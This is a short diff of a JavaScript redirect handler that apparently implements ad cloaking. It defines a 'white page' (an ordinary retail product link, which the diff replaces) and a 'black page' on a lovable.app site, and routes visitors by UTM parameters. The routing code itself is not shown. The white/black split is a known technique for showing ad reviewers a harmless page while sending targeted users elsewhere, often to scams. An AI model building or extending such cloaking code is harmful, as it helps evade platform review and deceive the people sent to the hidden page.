@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/floordirekt-klickfliese-mix-teak-30-x-30-cm-terrassenfliese-mit-drainagefunktion-wpc-fliese-1-st-S0I2A01T/";
+    const whitePageURL = "https://www.decjuba.com.au/products/girls-retro-crop-ringer-tee-lilrasp?utm_campaign=HOMEPAGE+GALLERY+-+KIDS+&utm_medium=Instagram&utm_source=Social&utm_content=www.instagram.com/p/DQso3gpDuOy/&variant=40600696520776";
     const blackPageURL = "https://nowhereher.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
